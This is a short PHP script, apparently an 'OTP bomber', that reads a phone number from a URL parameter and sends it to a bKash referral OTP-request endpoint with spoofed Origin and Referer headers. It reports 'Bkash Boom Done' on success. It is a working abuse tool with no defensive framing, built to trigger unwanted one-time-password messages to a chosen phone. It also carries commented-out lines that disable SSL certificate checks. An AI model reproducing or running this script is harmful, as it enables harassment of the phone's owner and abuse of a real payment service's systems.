<?php
$phn= $_GET['phone'];
$url = "https://cpp.bka.sh/external-services/referral/report/otp/request";

$data = array(
    'referrerWallet' => $phn,
    'otp' => '',
    'referrerEmail' => ''
);

$jsonData = json_encode($data);

$headers = array(
    'Content-Type: application/json',
    'User-Agent: Mozilla/5.0',
    'Origin: https://business.bkash.com',
    'Referer: https://business.bkash.com/'
);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

// Optional: If you need to ignore SSL verification, uncomment the following lines
// curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
// curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($curl);
$httpStatus = curl_getinfo($curl, CURLINFO_HTTP_CODE);

if ($response === false) {
    echo 'Curl error: ' . curl_error($curl);
} else {
    if ($httpStatus == 200) {
        echo 'Bkash Boom Done';
    } else {
        echo 'Unexpected response status: ' . $httpStatus;
    }
}

curl_close($curl);

?>
